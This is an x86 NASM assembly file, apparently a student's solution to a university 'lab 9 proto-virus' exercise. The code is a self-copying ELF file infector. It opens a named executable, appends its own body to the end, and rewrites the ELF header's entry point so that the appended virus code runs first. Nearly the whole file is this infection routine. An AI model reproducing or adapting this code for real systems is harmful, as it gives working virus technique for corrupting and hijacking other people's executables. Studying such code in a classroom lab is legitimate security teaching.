macros:
	%macro	syscall1 2
		mov	ebx, %2
		mov	eax, %1
		int	0x80
	%endmacro

	%macro	syscall3 4
		mov	edx, %4
		mov	ecx, %3
		mov	ebx, %2
		mov	eax, %1
		int	0x80
	%endmacro

	%macro  exit 1
		syscall1 1, %1
	%endmacro

	%macro  write 3
		syscall3 4, %1, %2, %3
	%endmacro

	%macro  read 3
		syscall3 3, %1, %2, %3
	%endmacro

	%macro  open 3
		syscall3 5, %1, %2, %3
	%endmacro

	%macro  lseek 3
		syscall3 19, %1, %2, %3
	%endmacro

	%macro  close 1
		syscall1 6, %1
	%endmacro
defines:
	%define	STK_RES	200
	%define	RDWR	2
	%define	SEEK_END 2
	%define SEEK_SET 0

	%define ENTRY		24
	%define PHDR_start	28
	%define	PHDR_size	32
	%define PHDR_memsize	20
	%define PHDR_filesize	16
	%define	PHDR_offset	4
	%define	PHDR_vaddr	8
	%define entry_ptr 0x08048000

	global _start

	section .text

_start:
	push ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage

; You code for this lab goes here
virus:
	call get_my_loc
	sub ecx, next_i-OutStr
	write 1, ecx, 31

main:
	mov eax, FileName
	open eax, RDWR, 777
	cmp eax, 0
	jl Error
	mov [ebp-4], eax ; ebp-4 => file descriptor

infection:
	append:
		xor ecx, ecx
		lseek [ebp-4], 0, SEEK_END
		mov [ebp - 8], eax ; ebp-8 => file size
		mov eax, virus_end
		call get_my_loc
		sub ecx, next_i-_start
		sub eax, ecx
		write [ebp-4], ecx, eax

	changeEntry:
		lseek [ebp-4], 0, SEEK_SET
		mov eax, ebp
		sub eax, 8
		sub eax, PHDR_size ; place in stack for 32 byte header -8-32
		read [ebp-4], eax, PHDR_size
		mov eax, entry_ptr
		add eax, [ebp-8] ; adress of orignial file + virus
		mov [ebp - 8 - PHDR_size + ENTRY], eax
		lseek [ebp-4], 0, SEEK_SET
		mov ecx, ebp
		sub ecx, 40
		write [ebp-4], ecx, 32
		close [ebp-4]

VirusExit:
	   exit 0       ; Termination if all is OK and no previous code to jump to
					; (also an example for use of above macros)

FileName:			db "ELFexec2short", 0
OutStr:				db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        	db "perhaps not", 10 , 0
PreviousEntryPoint: dd VirusExit

Error:
	exit 1

get_my_loc:
		call next_i
next_i:
		pop ecx
		ret

virus_end: